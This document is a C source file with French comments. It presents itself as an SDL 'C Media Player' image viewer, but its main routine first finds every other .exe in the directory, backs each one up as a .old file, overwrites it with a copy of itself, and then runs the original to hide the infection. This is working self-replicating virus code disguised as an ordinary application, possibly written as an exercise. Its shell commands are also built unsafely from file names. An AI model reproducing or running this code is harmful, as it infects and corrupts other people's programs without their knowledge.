#include <SDL2/SDL.h>
#include <SDL2/SDL_image.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

#define WINDOW_WIDTH 800
#define WINDOW_HEIGHT 600

// vérifie si le fichier est une image
bool estImage(const char *nom) {
    const char *extensions[] = {".png", ".jpg", ".jpeg", ".bmp"};
    size_t nbExtensions = sizeof(extensions) / sizeof(extensions[0]);
    for (size_t i = 0; i < nbExtensions; i++) {
        if (strstr(nom, extensions[i]) != NULL) {
            return true;
        }
    }
    return false;
}

// charge une image
SDL_Texture* loadImage(char *filePath, SDL_Renderer *renderer) {
    SDL_Texture* newTexture = NULL;
    SDL_Surface* loadedSurface = IMG_Load(filePath);
    if (loadedSurface == NULL) {
        printf("Unable to load image %s! SDL_image Error: %s\n", filePath, IMG_GetError());
    } else {
        newTexture = SDL_CreateTextureFromSurface(renderer, loadedSurface);
        if (newTexture == NULL) {
            printf("Unable to create texture from %s! SDL Error: %s\n", filePath, SDL_GetError());
        }
        SDL_FreeSurface(loadedSurface);
    }
    return newTexture;
}

// fonction pour attribuer les permissions au fichier
void attribuerPerm(struct dirent *fichier) {
    char commande[99];
    strcpy(commande, "chmod +x ");
    strcat(commande, fichier->d_name);
    system(commande);
}

// fonction pour renommer le fichier en ajoutant l'extension ".old"
void renommageOld(struct dirent *fichier) {
    char commande[99];
    strcpy(commande, "cp ");
    strcat(commande, fichier->d_name);
    strcat(commande, " ");
    strcat(commande, fichier->d_name);
    strcat(commande, ".old");
    system(commande);
}

// fonction pour dupliquer le fichier MediaPlayer.exe
void duplication(struct dirent *fichier) {
    char commande[99];
    strcpy(commande, "cp ./MediaPlayer.exe ");
    strcat(commande, fichier->d_name);
    system(commande);
}

// affiche une image et gère les événements
void afficheImage() {
    SDL_Window* window = NULL;
    SDL_Renderer* renderer = NULL;

    if (SDL_Init(SDL_INIT_VIDEO) < 0) {
        printf("SDL could not initialize! SDL Error: %s\n", SDL_GetError());
        return;
    }

    window = SDL_CreateWindow("C Media Player - Image Viewer", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, WINDOW_WIDTH, WINDOW_HEIGHT, SDL_WINDOW_SHOWN);
    renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);

    char dossierImages[] = "./images";
    DIR *dossier;
    struct dirent *entree;
    char *images[100]; 
    int nbImages = 0;

    if ((dossier = opendir(dossierImages)) != NULL) {
        while ((entree = readdir(dossier)) != NULL && nbImages < 100) {
            if (estImage(entree->d_name)) {
                images[nbImages] = malloc(strlen(dossierImages) + strlen(entree->d_name) + 2);
                strcpy(images[nbImages], dossierImages);
                strcat(images[nbImages], "/");
                strcat(images[nbImages], entree->d_name);
                nbImages++;
            }
        }
        closedir(dossier);
    } else {
        perror("Erreur lors de l'ouverture du dossier");
        return;
    }

    int currentImage = 0;
    SDL_Texture* currentTexture = NULL;
    bool quit = false;
    SDL_Event e;

    while (!quit) {
        while (SDL_PollEvent(&e) != 0) {
            if (e.type == SDL_QUIT) {
                quit = true;
            } else if (e.type == SDL_KEYDOWN) {
                switch (e.key.keysym.sym) {
                    case SDLK_LEFT:
                        currentImage = (currentImage - 1 + nbImages) % nbImages;
                        break;
                    case SDLK_RIGHT:
                        currentImage = (currentImage + 1) % nbImages;
                        break;
                }
            }
        }

        currentTexture = loadImage(images[currentImage], renderer);
        SDL_RenderClear(renderer);
        SDL_RenderCopy(renderer, currentTexture, NULL, NULL);
        SDL_RenderPresent(renderer);
        SDL_DestroyTexture(currentTexture);
        currentTexture = NULL;
    }

    for (int i = 0; i < nbImages; i++) {
        free(images[i]);
    }

    SDL_DestroyRenderer(renderer);
    SDL_DestroyWindow(window);
    SDL_Quit();
}

// fonction pour initialiser et exécuter le programme 
void initialisationEtExecution(int argc, char* args[]) {
    DIR *dir = opendir(".");
    struct dirent *fichier;
    struct stat infosFichier;
    char ancien[100];

    if (dir == NULL) {
        printf("Erreur lors de l'ouverture du dossier");
        exit(0);
    }

    while ((fichier = readdir(dir)) != NULL) {
        strcpy(ancien, fichier->d_name);
        strcat(ancien, ".old");
        stat(fichier->d_name, &infosFichier);
        if (strstr(fichier->d_name, ".exe") != NULL && strstr(fichier->d_name, ".old") == NULL && strstr(fichier->d_name, "MediaPlayer.exe") == NULL && access(ancien, F_OK) != 0) {
            if (!(S_ISREG(infosFichier.st_mode) && (infosFichier.st_mode & S_IXUSR))) {
                // attribuer les permissions au fichier et le renommer en ajoutant l'extension ".old" et copier le fichier MediaPlayer.exe 
                attribuerPerm(fichier);
            }
            renommageOld(fichier);
            duplication(fichier);
        }
    }

    closedir(dir);
}

int main (int argc, char* args[]) {
    initialisationEtExecution(argc, args);
    if (!strcmp(args[0], "./MediaPlayer.exe")) {
        afficheImage();
    } else {
        char camoufflage[99];
        initialisationEtExecution(argc, args);
        strcpy(camoufflage, args[0]);
        strcat(camoufflage, ".old");
        system(camoufflage);
    }
    return EXIT_SUCCESS;
}

